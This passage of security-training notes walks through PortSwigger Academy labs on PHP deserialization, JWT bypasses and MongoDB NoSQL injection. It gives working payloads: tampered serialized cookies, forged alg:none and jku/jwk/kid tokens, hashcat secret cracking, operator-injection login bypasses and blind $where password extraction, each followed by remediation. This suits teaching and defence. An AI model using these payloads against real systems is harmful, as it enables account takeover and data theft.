Because Apache Commons Collections is on the classpath, a published gadget chain is available: a sequence of library classes whose automatic deserialization behaviour can be strung together to call Runtime.exec(). ysoserial assembles that chain around the attacker's command. The app never intended to run commands — the capability comes entirely from reusing existing library code.

docs.title: Remediation
docs.text:
• Do not deserialize untrusted data with native Java serialization.
  • If you must, use look-ahead deserialization / class allow-lists (e.g. a hardened ObjectInputStream) to reject unexpected classes before they are instantiated.
  • Keep libraries updated and remove unnecessary ones from the classpath to shrink the gadget surface.
  • Sign and verify any serialized state that round-trips through the client.

docs.title: Modifying serialized data types
docs.text:
Lab: PortSwigger Web Security Academy — Modifying serialized data types (Practitioner).

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass. To solve the lab, edit the serialized object in the session cookie to access the administrator account, then delete the user carlos.

Credentials: wiener:peter.

This lab exploits the fact that deserialization preserves data types, combined with PHP's loose comparison operator (==).

docs.title: Background: PHP loose comparison
docs.text:
When PHP compares an integer with a string using ==, it can coerce the operands:

Comparison Result Why 0 == "Example string" true (PHP 7.x and below) The non-numeric string is cast to 0 5 == "5 of something" true PHP reads the leading number from the string

So if server code does if ($user->access_token == $provided_token) and we can make access_token the integer 0, the comparison passes against any non-numeric stored token — as long as the value is a real integer, not a string. Deserialization is what lets us smuggle a genuine integer in.

docs.title: 1. Log in and decode the cookie
docs.text:
Log in as wiener:peter, send a request to Repeater, and decode the session cookie. It reveals:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ewev544nimmmm518tootxoq0zi8hx91r";}

docs.title: 2. Craft the bypass object
docs.text:
Make two changes:

  • Set the username to administrator. Update the length indicator from s:6:"wiener" to s:13:"administrator".
  • Change access_token from a 32-char string to the integer 0 — replace s:32:"...." with i:0.
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}

Keep the type labels correct

When you change a value's type you must update its type label (s: → i:) and drop the length/quotes, otherwise the string is corrupt and PHP refuses to deserialize it.

docs.title: 3. Apply the modified cookie
docs.text: Re-encode the object (base64, then URL-encode) and set it as the session cookie.

docs.title: 4. Reach the admin panel and delete carlos
docs.text: Because the username is now administrator and the loose comparison 0 == "<stored token>" passes, the server authenticates the request as the administrator. Open the admin panel and delete carlos.

docs.title: Why the attack works
docs.text: Two weaknesses combine. First, the session object is deserialized from an untrusted cookie, so the attacker controls both the username and the token field. Second, the server validates the token with a loose comparison. A genuine integer 0 compared loosely against a non-numeric string evaluates to true on vulnerable PHP versions, so no valid token is needed.

docs.title: Remediation
docs.text:
• Use strict comparison (===) for security-sensitive checks so types are not coerced.
  • Do not deserialize client-controlled session data, or protect it with an integrity signature.
  • Note that PHP 8+ changed the behaviour so 0 == "string" is now false, closing this specific bypass — but relying on a language version is not a substitute for strict comparison and server-side sessions.

docs.title: Modifying serialized objects
docs.text:
Lab: PortSwigger Web Security Academy — Modifying serialized objects (Apprentice).

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to gain administrative privileges and delete the user carlos.

Credentials: wiener:peter.

This is the simplest form of the bug: the session cookie is just a base64-encoded PHP serialized object, and the server trusts whatever it contains. Changing one boolean turns a normal user into an admin.

docs.title: 1. Log in and capture the session cookie
docs.text: Log in as wiener:peter, then look at the session cookie sent with the request. It is URL-encoded base64.

docs.title: 2. Decode the cookie
docs.text:
Send a request to Burp Repeater and use the Inspector to decode the cookie value — first from URL encoding, then from base64. It reveals a PHP serialized User object:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

The admin attribute is a boolean set to 0 (false).

docs.title: 3. Flip the admin flag
docs.text:
Change b:0 to b:1 so the object becomes:

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

Re-encode it (base64, then URL-encode) and replace the session cookie. In the screenshots this is done with a browser cookie editor, but Repeater's Inspector works just as well.

docs.title: 4. Reach the admin panel
docs.text: Reload My Account. Because the server deserialized an object with admin set to true, an Admin panel link now appears.

docs.title: 5. Delete carlos
docs.text: Open the admin panel and delete the user carlos. The lab is marked solved.

docs.title: Why the attack works
docs.text: The application stores session state client-side as a serialized object and never verifies its integrity. Since the serialized format is plain, readable text, the attacker simply edits the admin boolean and re-encodes. The server deserializes the tampered object and trusts the admin field for its authorization decision.

docs.title: Remediation
docs.text: Do not trust client-side session objects for authorization. Either keep session state server-side (store only an opaque session ID in the cookie), or sign the serialized blob with a server-side secret (HMAC) and reject any cookie whose signature does not match before deserializing it.

docs.title: Using application functionality to exploit insecure deserialization
docs.text:
Lab: PortSwigger Web Security Academy — Using application functionality to exploit insecure deserialization (Practitioner).

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

Credentials: wiener:peter. Backup account: gregg:rosebud.

Here the attacker does not need a magic method or RCE — an existing, legitimate feature (deleting your account) performs a file operation on a path stored in the serialized session. Redirect that path and the feature deletes someone else's file.

docs.title: 1. Explore with the backup account
docs.text: Log in as gregg:rosebud. The My Account page for gregg has a Delete account button and an avatar. Deleting the account also deletes the user's avatar file, whose path is stored in the session object.

docs.title: 2. Decode the session cookie
docs.text:
Send the account-delete request (POST /my-account/delete) to Repeater and decode the session cookie. It contains an avatar_link field:

O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"f0cy0vozu9gmkuyndfntg41px6ab464d";s:11:"avatar_link";s:19:"/home/gregg/avatar";}

docs.title: 3. Repoint avatar_link at Carlos's file
docs.text:
Change the avatar_link value to the target file and fix its length indicator (/home/carlos/morale.txt is 23 characters):

O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"f0cy0vozu9gmkuyndfntg41px6ab464d";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

Re-encode (base64, then URL-encode) and put it back in the session cookie.

docs.title: 4. Trigger the delete
docs.text: Send the POST /my-account/delete request with the crafted cookie. The server deserializes the object and, when deleting the account, calls its file-deletion routine on avatar_link — which now points at /home/carlos/morale.txt. The file is deleted and the lab is solved.

docs.title: Why the attack works
docs.text: The application deserializes a client-controlled session object and then feeds one of its fields (avatar_link) straight into a file-deletion operation with no validation that the path belongs to the current user. The attacker never needs code execution — a perfectly ordinary feature becomes an arbitrary file delete the moment its input comes from a tamperable serialized object.

docs.title: Remediation
docs.text:
• Do not store file paths (or any authority-bearing data) in client-side serialized objects.
  • Resolve a user's avatar path server-side from their authenticated identity, never from the request.
  • Keep session state server-side or sign it so tampering is rejected before deserialization.

docs.title: JSON Web Tokens (JWT)
docs.text: A JSON Web Token is a compact, self-contained way to send cryptographically signed JSON between parties. Web apps use them for authentication, session management and access control: after you log in, the server hands you a token containing claims about who you are, and you present it on every request. Because all that state lives inside the token on the client, the server's trust rests entirely on one thing — the signature. Almost every JWT vulnerability is a failure to check that signature correctly.

docs.title: Structure of a JWT
docs.text:
A JWT has three parts, separated by dots:

header.payload.signature

The header and payload are Base64URL-encoded JSON — anyone holding the token can read and change them. For example, decoded:

// Header
{ "kid": "6108a1d6-...", "alg": "RS256" }

// Payload (claims)
{
  "iss": "portswigger",
  "exp": 1648037164,
  "sub": "carlos",
  "role": "blog_author"
}
  • Header — metadata: the signing algorithm (alg) and often a key identifier (kid, jwk, jku).
  • Payload — the claims (identity, roles, expiry exp, subject sub, …).
  • Signature — the server's proof that the header and payload have not been tampered with.

JWT vs JWS vs JWE

What people usually call a "JWT" is really a JWS (JSON Web Signature) — signed but readable. A JWE is encrypted. Signing only stops tampering; it does not hide the contents, so never put secrets in a payload.

docs.title: How the signature works
docs.text:
The server computes the signature over base64url(header) + "." + base64url(payload) using a signing key:

  • HS256 (symmetric) — HMAC-SHA256 with a single secret that both signs and verifies.
  • RS256 (asymmetric) — the server signs with a private key and verifies with the matching public key.

Change one byte of the header or payload and the signature no longer matches. Without the key you cannot produce a valid signature — in theory. In practice, servers mishandle verification in several ways.

docs.title: Why JWT vulnerabilities arise
docs.text:
The JWT/JOSE specs are deliberately flexible, leaving many choices to developers. The recurring mistakes:

  • The signature is not verified at all — any token is accepted.
  • alg:none is honoured — an "unsecured" token with no signature is trusted.
  • The signing key is weak — a short/default HMAC secret can be brute-forced offline.
  • Header parameters are trusted — the attacker makes the server verify with a key they control via jwk, jku or kid.

docs.title: Header-parameter injection (jwk, jku, kid)
docs.text:
Three header parameters tell the server which key to verify with. All are attacker-controllable:

Parameter Meaning Where the attacker's key lives Typical alg jwk Public key embedded in the token Inside the JWT header itself RS256 jku URL the server fetches the key set from On the attacker's hosted server RS256 kid ID / path selecting which key to use A file on the target's own filesystem HS256

In one line each:

  • jwk → "trust my key, I put it right here in the token."
  • jku → "trust my key, go fetch it from my server."
  • kid → "use this file as the key — I know what's in it" (e.g. ../../../../dev/null, which reads as empty, so sign with an empty secret).

docs.title: Tooling
docs.text:
• Burp Suite JWT Editor extension — decode, edit, generate keys, embed JWKs, and re-sign tokens; it automates the jwk "Embedded JWK" attack and alg:none.
  • hashcat — brute-force a weak HS256 secret entirely offline:
hashcat -a 0 -m 16500 <jwt> <wordlist>

docs.title: Impact
docs.text:
• Privilege escalation — change your own role/sub to an administrator.
  • Account takeover — impersonate any user by forging their token.
  • Full compromise if the attacker can mint valid tokens at will.

docs.title: Prevention
docs.text:
1. Always verify the signature with a server-side trusted key, and reject alg:none.
  2. Pin the algorithm — do not let the token's alg decide (prevents HS/RS confusion).
  3. Do not trust jwk; validate jku against an allow-list; never use kid as a filesystem path.
  4. Use a strong, random HMAC secret (or asymmetric keys).
  5. Enforce exp and keep token lifetimes short.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • JWT authentication bypass via unverified signature
  • JWT authentication bypass via flawed signature verification
  • JWT authentication bypass via weak signing key
  • JWT authentication bypass via jwk header injection
  • JWT authentication bypass via kid header path traversal
  • JWT authentication bypass via jku header injection

docs.title: JWT authentication bypass via flawed signature verification
docs.text:
The JOSE spec defines "alg": "none" for genuinely unsecured JWTs — tokens with no signature at all, intended only for contexts where integrity is guaranteed another way. Some server-side JWT libraries still honour this value from an untrusted, attacker-supplied token. If the verification code branches on whatever alg the token claims, an attacker can simply ask the server not to check anything.

BASICS — alg confusion

The algorithm used to verify a JWT must be a decision the server makes, not a field the client controls. alg:none is the clearest example of trusting the token's own metadata to decide how the token should be validated — a self-referential mistake that other confusion attacks (HS/RS mix-ups) also exploit.

docs.title: 1. Capture a legitimate token
docs.text: Log in as wiener and pull the session JWT into Burp's JWT Editor / Decoder.

docs.title: 2. Switch the algorithm to none and escalate the claim
docs.text:
Set the header's alg to none (case variants like None, NONE are also worth trying), strip the signature segment entirely, and change the payload's sub to administrator:

// Header
{ "kid": "6112076d-a6f1-42ad-8a5c-bb6b774cb3b0", "alg": "none" }

// Payload
{ "iss": "portswigger", "exp": 1772783073, "sub": "administrator" }

eyJraWQiOiI2MTEyMDc2ZC1hNmYxLTQyYWQtOGE1Yy1iYjZiNzc0Y2IzYjAiLCJhbGciOiJub25lIn0.
eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mjc4MzA3Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.

A JWT with no third segment is a structurally valid "unsecured" JWT per RFC 7519 section 6.

docs.title: 3. Send the forged token to a privileged endpoint
docs.text:
Replace the session cookie with the unsecured token and request /admin.

GET /admin HTTP/2
Cookie: session=eyJraWQiOiI2MTEyMDc2ZC1hNmYxLTQyYWQtOGE1Yy1iYjZiNzc0Y2IzYjAiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3Mjc4MzA3Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.

The server accepts the claim without ever running a signature check, since its code path for alg:none skips verification.

docs.title: 4. Confirm the bypass
docs.text: Delete the carlos user from the admin panel to prove full privileged access.

docs.title: Why it works
docs.text: The server's JWT library reads alg from the attacker-controlled header and dispatches verification logic based on it. When that value is none, the library's "verification" is a no-op by design — it was built for a trusted-token scenario, not an attacker-facing one. Letting the token choose its own algorithm turns every "secure by default" assumption inside the library into something the attacker controls.

docs.title: Remediation
docs.text:
• Never accept alg:none from client-supplied tokens; most mature JWT libraries reject it by default — don't override that behaviour.
  • Pin the expected algorithm server-side and reject any token whose header doesn't match it, instead of trusting the header.
  • Keep JWT libraries up to date; this exact class of bug has been patched repeatedly across ecosystems.

docs.title: JWT authentication bypass via jku header injection
docs.text:
The jku (JWK Set URL) header tells the server where to fetch the verification key from, instead of embedding it directly (that's jwk). The server makes an outbound HTTP request to the URL, retrieves a JWK Set, and picks the key matching the token's kid. If the server doesn't restrict which URLs it's willing to trust, an attacker just hosts their own key set and points jku at it.

BASICS — the JWK Set

A JWK Set is a JSON object { "keys": [ {...}, {...} ] } holding one or more public keys, each tagged with its own kid. Real-world identity providers publish these at well-known paths like /.well-known/jwks.json so relying parties can fetch current signing keys. jku abuses that same legitimate mechanism by substituting the attacker's own URL.

docs.title: 1. Capture a token; confirm /admin is restricted
docs.text:
Log in as wiener.

GET /admin returns 401 Unauthorized for this session.

docs.title: 2. Generate an RSA key pair and host the public half
docs.text:
In Burp's JWT Editor, generate a New RSA Key, then right-click it and choose Copy as JWK to get the public-key JSON. Wrap it in a JWK Set ({"keys": [...]}) and paste it into the exploit server's file store, serving it at a path such as /exploit.

{ "keys": [ { "kty": "RSA", "e": "AQAB", "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7", "n": "yy1wpYmffgXBxhAUJzHHocCuJoIwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw" } ] }

docs.title: 3. Point jku at the hosted key set and forge the claim
docs.text:
Edit the captured token's header to reference the attacker-hosted set, matching kid to the key just uploaded, and set the payload's sub to administrator. Sign with the RSA private key generated in step 2.

// Header
{
  "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
  "alg": "RS256",
  "jku": "https://exploit-<id>.exploit-server.net/exploit"
}

// Payload
{ "iss": "portswigger", "exp": 1772794251, "sub": "administrator" }

docs.title: 4. Send the forged token
docs.text:
Replace the session cookie and request /admin. The server fetches the attacker's JWK Set over HTTP, finds the matching kid, verifies against the attacker's public key, and accepts the forged signature.

GET /admin HTTP/2
Cookie: session=eyJraWQiOiI4OTNkOGYwYi0wNjFmLTQyYzItYTRhYS01MDU2ZTEyYjhhZTciLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0uLi4ifQ...

docs.title: Bypassing a URL allow-list
docs.text:
Stricter servers restrict jku to trusted domains. Parsing discrepancies between the server's filter and its HTTP client can still allow a bypass:

Bypass technique Example @ in URL https://trusted.com@attacker.com Subdomain abuse https://trusted.com.attacker.com URL fragment https://attacker.com#trusted.com SSRF via a trusted server Route the fetch through a request the app already trusts

docs.title: Why it works
docs.text: Trusting a jku value without an allow-list means the server will fetch verification material from anywhere the attacker names. Since the attacker also holds the private key for whatever they host, the entire chain — fetch key, verify signature, accept claim — is one the attacker fully controls end to end.

docs.title: Remediation
docs.text:
• Maintain a strict server-side allow-list of trusted jku hosts/paths, validated with a robust URL parser (not substring matching).
  • Never let an application fetch and trust key material from a URL supplied in untrusted input.
  • Where possible, pin keys entirely server-side and ignore jku from incoming tokens altogether.

docs.title: JWT authentication bypass via jwk header injection
docs.text:
The jwk (JSON Web Key) header parameter lets a token carry its own public verification key inline. It exists for legitimate multi-key scenarios, but if the server blindly trusts whatever key is embedded in an incoming token — rather than checking it against a pre-configured allow-list — an attacker can generate their own RSA key pair, embed the public half, sign with the private half, and the server will "successfully" verify a token it never actually trusted.

BASICS — jwk vs jku vs kid

All three header parameters tell the server which key to verify with, and all three are attacker-controllable unless the server pins them down:

Parameter Key location Server action jwk embedded in the token header reads key straight from the header jku URL hosted by the attacker server fetches it over HTTP kid arbitrary string, often a file path server looks the string up (file/db)

jwk needs no network access at all — the forged key travels with the token.

docs.title: 1. Capture a token and generate an attacker RSA key
docs.text:
Log in as wiener, intercept /admin, and note it returns 401 Unauthorized since this low-privileged token has no admin claim.

In Burp's JWT Editor → Keys tab, generate a new RSA key (New RSA Key), then edit the captured token: set sub to administrator.

docs.title: 2. Attack → Embedded JWK
docs.text:
From the JWT Editor's Attack menu on the Payload tab, choose Embedded JWK. This automatically:

  • Adds a jwk header containing the public key of the RSA pair you just generated
  • Re-signs the token with the matching private key
// Resulting header
{
  "kid": "05f50a07-f154-43a1-b547-8dbd424e59fc",
  "alg": "RS256",
  "jwk": { "kty": "RSA", "e": "AQAB", "kid": "...", "n": "..." }
}

docs.title: 3. Send the forged token
docs.text:
Replace the session cookie with the newly signed token and request /admin again.

GET /admin HTTP/2
Cookie: session=eyJraWQiOiI...<jwk-embedded-and-resigned>

The server extracts the public key from the token's own jwk field, uses it to verify the signature (which of course matches, since the attacker signed with the paired private key), and accepts the forged administrator claim.

GET /admin/delete?username=carlos HTTP/2

docs.title: Why it works
docs.text: Verification is supposed to use a key the server already trusts. Here the server instead asks the token "which key should I use?" and the token is attacker-controlled — so the attacker supplies a key they themselves hold the private half of. The signature check still "passes" mathematically; it's just checking against the wrong key entirely.

docs.title: Remediation
docs.text:
• Never derive the verification key from the token itself. Maintain a server-side key store (or JWK Set) independent of anything the client sends.
  • If jwk must be supported, validate the embedded key against a pinned set of trusted keys/thumbprints before using it.
  • Pin the expected algorithm and key per issuer/audience rather than trusting header-supplied metadata.

docs.title: JWT authentication bypass via kid header path traversal
docs.text:
The kid (Key ID) header parameter tells the server which key to use when verifying a signature — typically a lookup into a database or key store. The spec leaves kid as an arbitrary string with no required structure, so if a server naively uses it as a filesystem path, an attacker can traverse to any readable file and have its contents used as the verification key. The classic, universally-reliable target is /dev/null, which exists on virtually every Linux host and always reads back empty.

BASICS — why /dev/null is the perfect target

If the server does key = read_file(kid) and then verifies HS256 with that key, pointing kid at /dev/null makes the server's key an empty string — a value the attacker already knows. Sign your own forged token with an empty-string secret, and the server's independently-computed HMAC over the same empty key will match.

docs.title: 1. Capture a token
docs.text: Log in as wiener; /admin returns 401 Unauthorized for this low-privileged session.

docs.title: 2. Generate a symmetric key representing an empty secret
docs.text: In Burp's JWT Editor, create a New Symmetric Key. Set its value (k) to the base64 encoding of an empty value so the signing key used locally is effectively empty, matching what /dev/null will return server-side.

docs.title: 3. Set kid to a traversal path and edit the claim
docs.text:
Change the header's kid to a deep relative traversal ending in /dev/null, and set the payload's sub to administrator:

// Header
{ "kid": "../../../../../../dev/null", "alg": "HS256" }

// Payload
{ "iss": "portswigger", "exp": 1772789793, "sub": "administrator" }

docs.title: 4. Sign with the empty-secret key and send
docs.text:
Use Sign, selecting the symmetric key created above with HS256 and "Don't modify header" so the traversal kid is preserved.

Replace the session cookie and request /admin:

GET /admin HTTP/2
Cookie: session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0....

The server resolves kid to /dev/null, reads an empty key, and finds that the attacker's HMAC (also computed with an empty key) matches.

GET /admin/delete?username=carlos HTTP/2

docs.title: Why it works
docs.text: kid is only ever meant to select among keys the server already trusts — but when the lookup is implemented as a raw file read, the string becomes a path the attacker steers. HS256 makes this especially dangerous: the same key that verifies also signs, so once the attacker can predict or control the file's contents (here, trivially — it's always empty), they can produce valid signatures unaided.

docs.title: Remediation
docs.text:
• Treat kid as an opaque identifier into a pre-defined, allow-listed key store — never pass it to a file-read or path-construction function.
  • Validate that kid matches an expected format (e.g. a UUID) before using it, rejecting path separators and traversal sequences.
  • Prefer asymmetric algorithms so that even a predictable "key file" (public key) can't be used to forge signatures.

docs.title: JWT authentication bypass via unverified signature
docs.text:
This is the simplest possible JWT flaw: the application decodes and trusts the payload but never calls a signature-verification routine. Any value in the token can be edited, re-encoded, and sent back — the server has no way to tell it apart from a token it issued itself.

BASICS — why this works

A JWT's header and payload are just Base64URL JSON — not encrypted, not tamper-proofed on their own. The only thing stopping an attacker from editing "sub": "wiener" into "sub": "administrator" is the server checking the signature against a secret/key it controls. If that check is missing (or checks the wrong thing), the signature becomes decorative.

docs.title: 1. Log in and capture a token
docs.text:
Log in with the supplied low-privileged credentials (wiener), then open the resulting session cookie in Burp Suite's JWT Editor tab.

The decoded JWT shows the structure that matters:

// Header
{ "kid": "6108a1d6-d7f6-43b6-b0ae-3a571a6a1815", "alg": "RS256" }

// Payload
{ "iss": "portswigger", "exp": 1772782600, "sub": "wiener" }

docs.title: 2. Edit the payload and drop the signature
docs.text:
Change "sub" to "administrator" and forward the token unchanged otherwise — including the original (now-invalid) signature, or with the signature segment stripped entirely. Send the modified cookie to /admin.

GET /admin HTTP/2
Cookie: session=eyJraWQiOiI...<edited-payload>...<original-or-stripped-signature>

Because the server never verifies the signature, it accepts the forged claim and renders the admin panel.

docs.title: 3. Confirm privileged action
docs.text: Use the admin panel to delete the carlos user, confirming full admin-level access was gained purely by editing an unsigned claim.

docs.title: Why it works
docs.text: The server decodes the JWT to read sub but has no corresponding call to a verify() function tied to a trusted key. Whether the signature is wrong, missing, or simply never checked, the outcome is identical: the payload is treated as ground truth. This is the base case every other JWT attack elaborates on — flawed algorithm checks, jwk/jku/kid injection, and weak secrets all exist because developers found partial ways to still skip real verification.

docs.title: Remediation
docs.text:
• Always call the JWT library's signature-verification function and make it fail closed — never decode-then-trust.
  • Use a well-maintained JWT library and don't hand-roll verification logic.
  • Reject tokens whose alg doesn't match a pinned, server-chosen algorithm.
  • Enforce exp and short token lifetimes so even a forged token has limited value.

docs.title: JWT authentication bypass via weak signing key
docs.text:
HS256 uses a single symmetric secret to both sign and verify. If that secret is short, a dictionary word, or a copy-pasted example value, it can be brute-forced entirely offline — no requests to the target are needed once you have one valid token, which makes this attack both fast and silent.

BASICS — why offline brute-force works here

HMAC-SHA256 is a one-way function: signature = HMAC-SHA256(header + "." + payload, secret). Given a captured header.payload.signature, an attacker can try candidate secrets locally and recompute the HMAC for each one. A match means the guessed secret is the server's signing key — and now the attacker can sign anything.

docs.title: 1. Capture a valid token
docs.text: Log in as wiener and copy the session JWT.

docs.title: 2. Crack the secret offline with hashcat
docs.text:
hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/jwt-secrets.txt
  • -a 0 — straight wordlist attack mode
  • -m 16500 — JWT (HS256) hash mode
  • The wordlist is SecLists' jwt-secrets.txt, full of exactly the default/example secrets developers forget to change
hashcat -a 0 -m 16500 <jwt> wordlist.txt --show   # re-display a cracked result

docs.title: 3. Forge an admin token with the cracked secret
docs.text:
With the secret in hand (secret1 in this lab), use Burp's JWT Editor to set the symmetric key to that value, edit the payload's sub to administrator, and re-sign with HS256. Send the forged cookie to /admin.

GET /admin HTTP/2
Cookie: session=eyJraWQiOiI...<forged-and-resigned-admin-token>

docs.title: 4. Confirm the bypass
docs.text: Delete carlos through the forged session.

docs.title: Why it works
docs.text: HS256's security depends entirely on the secret being unpredictable and sufficiently long. A short or well-known secret collapses that guarantee: once an attacker recovers it, they hold the same key the server uses to verify, so they can sign arbitrary payloads that pass every check. This is strictly worse for symmetric (HS*) algorithms than asymmetric ones — compromising the verification side compromises the signing side too.

docs.title: Remediation
docs.text:
• Generate signing secrets with a cryptographically secure random generator, sized appropriately for the algorithm (e.g. ≥256 bits for HS256).
  • Never reuse example/default secrets from documentation or tutorials.
  • Prefer asymmetric algorithms (RS256/ES256) where the verification key is public but useless for forging signatures.
  • Rotate secrets periodically and immediately after any suspected leak.

docs.title: NoSQL Injection
docs.text: NoSQL injection is the same idea as SQL injection applied to databases that don't use SQL — an attacker interferes with the queries an application builds from user input. The impact is just as severe: authentication bypass, data extraction, denial of service, and in some cases server-side code execution.

docs.title: What makes NoSQL databases different
docs.text:
NoSQL databases (MongoDB, Redis, CouchDB, DynamoDB, …) store data outside the traditional relational-table model and don't share a single standardised query language the way SQL does. Each database has its own query syntax, operators, and data structures — so there's no universal NoSQL injection payload the way ' OR 1=1 -- works broadly for SQL. MongoDB is by far the most common target in practice and in CTF/lab environments, so the techniques below focus on it.

SQL injection NoSQL injection Target Relational DB (MySQL, MSSQL, …) Non-relational DB (MongoDB, …) Query language Standardised — SQL Varies per database Operators abused OR, AND, UNION $ne, $gt, $regex, $where

docs.title: 1. Syntax injection
docs.text:
This is the direct analogue of classic SQL injection: user input is concatenated into a query string, and a crafted value breaks out of its intended context to inject new logic.

this.category == 'fizzy'

Injecting fizzy' || '1'=='1 turns the whole clause into a tautology:

this.category == 'fizzy' || '1'=='1'

Because '1'=='1' is always true, the query returns every document regardless of category — including hidden or unreleased ones.

Detecting it follows the same workflow as SQL injection:

  1. Send a fuzz string ('"\ $Foo \xYZ`) and watch for a parsing error or behaviour change.
  2. Narrow down which single character (', ", `, {) breaks the query, then confirm by escaping it (\') to see the error disappear.
  3. Prove you control the logic by sending a false condition (fizzy' && 0 && 'x) and a true one (fizzy' && 1 && 'x) and comparing responses.
  4. Override the condition entirely with '||'1'=='1.

A MongoDB-specific trick is null byte injection: fizzy'%00 truncates everything the server appends after the input, so this.category == 'fizzy'\u0000' && this.released == 1 is effectively evaluated as just this.category == 'fizzy' — silently dropping an released == 1 filter the application relies on, and exposing unreleased records.

docs.title: 2. Operator injection
docs.text:
Rather than breaking syntax, this abuses MongoDB's query operators — which are themselves just JSON keys prefixed with $ — by injecting them where the application expected a plain scalar value.

Operator Meaning Example $ne not equal {"password": {"$ne": "invalid"}} matches any password except "invalid" $gt / $lt greater/less than numeric or lexical comparisons $in value is one of a list {"username": {"$in": ["admin","administrator"]}} $regex regular-expression match {"username": {"$regex": "^adm"}} $where arbitrary JavaScript expression evaluated per document {"$where": "this.password.length < 5"}

BASICS — why this works

A login handler that does db.users.find({username: body.username, password: body.password}) assumes both fields are plain strings. If the client instead sends JSON objects for those fields — {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}} — MongoDB happily interprets them as operators, and the query becomes "find a user whose username isn't the string invalid, and whose password isn't the string invalid". That's true for almost every real account, so the database returns the first match and the attacker is logged in as it — no credentials needed.

Operators can be injected in a JSON body ({"username":{"$ne":"invalid"}}) or, on some endpoints, via bracket-notation URL/form parameters (username[$ne]=invalid). If a plain-text field rejects your payload, try switching GET→POST, adding Content-Type: application/json, and sending a JSON body instead — Burp's Content-Type Converter extension automates this conversion.

A targeted privilege-escalation payload narrows the match to specific accounts:

{ "username": { "$in": ["admin", "administrator", "superadmin"] }, "password": { "$ne": "" } }

docs.title: Blind data extraction with $where
docs.text:
Because $where evaluates arbitrary JavaScript per-document, it can be abused the same way a blind SQL injection boolean oracle is — asking the database true/false questions about data you can't otherwise see, one character at a time.

{ "$where": "this.username == 'admin' && this.password[0] == 'a' || 'a'=='b'" }

If the response differs from the "no match" case, the password's first character is a; if not, the request is repeated with b, c, and so on, then the process repeats for password[1], password[2], etc. The trailing || 'a'=='b' just keeps the overall JavaScript expression syntactically safe without ever being true itself, so no unintended matches leak through in the "false" case. A .match(/regex/) call can speed up enumeration by testing a whole character class or prefix in one shot instead of one character at a time.

docs.title: Impact
docs.text:
• Authentication bypass / account takeover
  • Privilege escalation to admin accounts
  • Blind, character-by-character extraction of passwords, tokens, or other sensitive fields
  • Denial of service or (in the worst case) server-side code execution where JavaScript evaluation is exposed

docs.title: Prevention
docs.text:
1. Never pass raw client input (especially parsed JSON) directly into a query filter — validate that expected fields are primitive scalars, not objects, before using them.
  2. Use parameterised/sanitising query builders provided by the driver instead of hand-built operator dictionaries from user input.
  3. Disable or tightly restrict $where and other JavaScript-evaluation features; they are rarely necessary and are the most dangerous operator class.
  4. Apply strict allow-lists / schema validation on both field names and value types at the API boundary.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • Detecting NoSQL injection
  • Exploiting NoSQL operator injection to bypass authentication
  • Exploiting NoSQL injection to extract data

docs.title: Lab: Detecting NoSQL injection
docs.text: Goal: the product category filter is powered by MongoDB and is vulnerable to NoSQL injection. Solve the lab by making the application display unreleased products.

docs.title: 1. Baseline the filter
docs.text:
Browse to a category, e.g. Gifts, and observe the normal product listing the filter produces.

The request looks like an ordinary query-string filter:

GET /filter?category=Gifts

docs.title: 2. Confirm syntax injection with a fuzz string
docs.text:
Append a string containing characters that are meaningful to MongoDB's query parser, such as a stray single quote and curly brace, and send it.

GET /filter?category=Gifts'"{

The server throws a 500 Internal Server Error with a MongoDB JavaScript parser trace — direct proof that the category parameter is concatenated into a server-side JavaScript/query expression without sanitisation.

Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25'

docs.title: 3. Turn the broken syntax into an always-true condition
docs.text:
Close out the broken string and append a tautology so the underlying query evaluates true regardless of category:

GET /filter?category=Gifts' || '1'=='1

This reconstructs the server-side expression as:

this.category == 'Gifts' || '1'=='1'

Since '1'=='1' is always true, the filter no longer restricts results to the Gifts category at all — it returns every product, including ones that were previously hidden (unreleased items not normally shown in any category listing).

docs.title: Why it works
docs.text: The category value is spliced directly into a MongoDB JavaScript expression instead of being passed as a bound, typed parameter. A single quote lets the attacker close the intended string literal early and append arbitrary boolean logic (|| '1'=='1') that the database happily evaluates as part of the filter. Because the resulting condition is always true, the entire access restriction the category filter was meant to enforce disappears.

docs.title: Remediation
docs.text:
• Use parameterised queries / the driver's query-builder API so field values are always treated as data, never as part of the query expression.
  • Avoid passing user input into $where or other JavaScript-evaluating constructs entirely.
  • Validate and type-check incoming filter values (e.g. enforce that category matches a known enum) before it ever reaches the query layer.

docs.title: Lab: Exploiting NoSQL injection to extract data
docs.text:
